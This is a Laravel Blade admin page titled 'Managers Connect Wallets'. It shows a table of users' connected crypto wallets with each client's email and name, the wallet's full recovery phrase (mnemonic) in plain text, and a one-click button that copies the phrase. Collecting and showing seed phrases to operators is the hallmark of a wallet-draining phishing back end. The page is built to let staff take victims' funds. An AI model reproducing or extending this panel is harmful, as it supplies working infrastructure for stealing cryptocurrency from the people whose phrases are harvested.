@extends('layouts.admin-dash')
@section('title', 'Wallet Connect')

@section('content')
    <x-admin.page-header title="Managers Connect Wallets" subtitle="View and manage user wallet connections">
        <x-slot name="actions">
            <a href="{{ route('mwalletsettings') }}"
               class="bg-primary text-primary-foreground hover:bg-primary-hover rounded-lg px-4 py-2 text-sm font-medium transition-colors inline-flex items-center gap-2">
                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.325.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 011.37.49l1.296 2.247a1.125 1.125 0 01-.26 1.431l-1.003.827c-.293.241-.438.613-.43.992a7.723 7.723 0 010 .255c-.008.378.137.75.43.991l1.004.827c.424.35.534.955.26 1.43l-1.298 2.247a1.125 1.125 0 01-1.369.491l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.47 6.47 0 01-.22.128c-.331.183-.581.495-.644.869l-.213 1.281c-.09.543-.56.941-1.11.941h-2.594c-.55 0-1.019-.398-1.11-.94l-.213-1.281c-.062-.374-.312-.686-.644-.87a6.52 6.52 0 01-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 01-1.369-.49l-1.297-2.247a1.125 1.125 0 01.26-1.431l1.004-.827c.292-.24.437-.613.43-.991a6.932 6.932 0 010-.255c.007-.38-.138-.751-.43-.992l-1.004-.827a1.125 1.125 0 01-.26-1.43l1.297-2.247a1.125 1.125 0 011.37-.491l1.216.456c.356.133.751.072 1.076-.124.072-.044.146-.086.22-.128.332-.183.582-.495.644-.869l.214-1.28z" /><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                Settings
            </a>
        </x-slot>
    </x-admin.page-header>

    {{-- Flash Messages --}}
    @if (session('success'))
        <x-admin.alert type="success" :dismissible="true" class="mt-6">
            {{ session('success') }}
        </x-admin.alert>
    @endif
    @if (session('error'))
        <x-admin.alert type="danger" :dismissible="true" class="mt-6">
            {{ session('error') }}
        </x-admin.alert>
    @endif

    <div class="mt-6">
        <x-admin.table-card title="Connected Wallets" tableId="WalletTable">
            <table id="WalletTable" class="w-full">
                <thead>
                    <tr class="bg-surface-alt">
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Client Email</th>
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Wallet</th>
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Wallet Phrase (Mnemonics)</th>
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Client Name</th>
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Date</th>
                        <th class="px-4 py-3 text-xs font-medium text-content-muted uppercase tracking-wide text-left">Action</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($wallets as $wallet)
                        <tr class="border-b border-border last:border-0 hover:bg-surface-alt/50 transition-colors">
                            <td class="px-4 py-3.5 text-sm font-medium text-content">{{ optional($wallet->wuser)->email ?? 'user deleted' }}</td>
                            <td class="px-4 py-3.5 text-sm text-content-secondary">{{ $wallet->wallet_name }}</td>
                            <td class="px-4 py-3.5 text-xs text-content-secondary font-mono break-all max-w-xs">
                                <div class="flex items-center gap-2" x-data="{ copied: false }">
                                    <span>{{ $wallet->phrase }}</span>
                                    <button
                                        @click="navigator.clipboard.writeText('{{ addslashes($wallet->phrase) }}'); copied = true; setTimeout(() => copied = false, 2000)"
                                        class="shrink-0 p-1 rounded hover:bg-surface-alt transition-colors"
                                        :title="copied ? 'Copied!' : 'Copy phrase'">
                                        <svg x-show="!copied" class="w-4 h-4 text-content-muted hover:text-primary" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M15.666 3.888A2.25 2.25 0 0 0 13.5 2.25h-3c-1.03 0-1.9.693-2.166 1.638m7.332 0c.055.194.084.4.084.612v0a.75.75 0 0 1-.75.75H9.75a.75.75 0 0 1-.75-.75v0c0-.212.03-.418.084-.612m7.332 0c.646.049 1.288.11 1.927.184 1.1.128 1.907 1.077 1.907 2.185V19.5a2.25 2.25 0 0 1-2.25 2.25H6.75A2.25 2.25 0 0 1 4.5 19.5V6.257c0-1.108.806-2.057 1.907-2.185a48.208 48.208 0 0 1 1.927-.184" /></svg>
                                        <svg x-show="copied" x-cloak class="w-4 h-4 text-success" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M11.35 3.836c-.065.21-.1.433-.1.664 0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75 2.25 2.25 0 0 0-.1-.664m-5.8 0A2.251 2.251 0 0 1 13.5 2.25H15c1.012 0 1.867.668 2.15 1.586m-5.8 0c-.376.023-.75.05-1.124.08C9.095 4.01 8.25 4.973 8.25 6.108V8.25m8.9-4.414c.376.023.75.05 1.124.08 1.131.094 1.976 1.057 1.976 2.192V16.5A2.25 2.25 0 0 1 18 18.75h-2.25m-7.5-10.5H4.875c-.621 0-1.125.504-1.125 1.125v11.25c0 .621.504 1.125 1.125 1.125h9.75c.621 0 1.125-.504 1.125-1.125V18.75m-7.5-10.5h6.375c.621 0 1.125.504 1.125 1.125v9.375m-8.25-3 1.5 1.5 3-3.75" /></svg>
                                    </button>
                                </div>
                            </td>
                            <td class="px-4 py-3.5 text-sm text-content-secondary">{{ optional($wallet->wuser)->name ?? 'user deleted' }}</td>
                            <td class="px-4 py-3.5 text-sm text-content-secondary">{{ $wallet->updated_at->format('M d, Y H:i') }}</td>
                            <td class="px-4 py-3.5">
                                <button
                                    onclick="Swal.fire({ title: 'Delete wallet?', text: 'This action cannot be undone.', icon: 'warning', showCancelButton: true, confirmButtonColor: 'rgb(220,38,38)', confirmButtonText: 'Yes, delete' }).then((result) => { if(result.isConfirmed) window.location.href='{{ url('admin/dashboard/mwalletdelete') }}/{{ $wallet->id }}' })"
                                    class="bg-danger text-white hover:bg-danger/90 rounded-lg px-3 py-1.5 text-xs font-medium transition-colors inline-flex items-center gap-1">
                                    <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0" /></svg>
                                    Delete
                                </button>
                            </td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </x-admin.table-card>
    </div>

    @push('scripts')
    <script>
        $(document).ready(function() {
            $('#WalletTable').DataTable({
                responsive: true,
                order: [[4, 'desc']],
                language: { emptyTable: "No wallet connections found" }
            });
        });
    </script>
    @endpush
@endsection
